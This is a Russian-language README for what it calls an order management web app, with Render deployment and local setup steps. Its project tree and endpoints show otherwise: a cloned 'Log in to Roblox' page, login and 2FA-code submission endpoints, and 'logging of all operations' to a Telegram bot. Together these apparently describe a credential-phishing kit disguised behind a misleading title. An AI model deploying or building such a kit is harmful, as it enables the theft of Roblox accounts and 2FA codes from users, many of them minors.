# Order Management App

Веб-приложение для управления заказами и партнерами.

## Возможности

- Управление заказами и партнерами
- Современный веб-интерфейс на Next.js
- API для работы с заказами
- Панель управления партнерами
- Полная совместимость с Render
- Автоматическое развертывание через GitHub

## Развертывание на Render

### 1. Подготовка

1. Убедитесь, что у вас есть аккаунт на [Render.com](https://render.com)
2. Создайте новый Web Service
3. Подключите ваш GitHub репозиторий

### 2. Настройка переменных окружения

В настройках сервиса на Render добавьте следующие переменные:

```
TELEGRAM_BOT_TOKEN=ваш_токен_бота
TELEGRAM_CHAT_ID=ваш_chat_id
```

**Важно:** Замените `ваш_токен_бота` и `ваш_chat_id` на реальные значения:
- Токен бота получается у @BotFather в Telegram
- Chat ID можно узнать, отправив сообщение боту и проверив логи

### 3. Автоматическое развертывание

После подключения репозитория Render автоматически:
- Установит зависимости из `requirements.txt`
- Запустит приложение с помощью Gunicorn
- Настроит HTTPS и домен

## Локальная разработка

### Установка зависимостей

```bash
pip install -r requirements.txt
```

### Запуск

```bash
python app.py
```

Приложение будет доступно по адресу: http://localhost:5000

### Тестирование

Для проверки работоспособности используйте:

```bash
python test_app.py
```

Этот скрипт проверит все основные эндпоинты приложения.

## Структура проекта

```
roblox/
├── app.py                 # Основной файл приложения
├── requirements.txt       # Зависимости Python
├── render.yaml           # Конфигурация Render
├── static/               # Статические файлы
│   ├── js/
│   │   └── script.js     # JavaScript логика
│   ├── style.css         # Стили
│   └── Log in to Roblox.html  # Главная страница
└── templates/            # Шаблоны Flask
    └── login.html        # Страница входа
```

## API Endpoints

- `GET /` - Главная страница входа
- `POST /login` - Авторизация пользователя
- `POST /submit_code` - Подтверждение 2FA кода
- `GET /health` - Проверка здоровья сервиса

## Безопасность

- Все запросы к Roblox API выполняются через HTTPS
- CSRF токены для защиты от атак
- Валидация входных данных
- Логирование всех операций в Telegram

## Поддержка

При возникновении проблем проверьте:
1. Правильность токена Telegram бота
2. Корректность chat_id
3. Логи в консоли Render
4. Статус эндпоинта `/health`

## Лицензия

MIT License 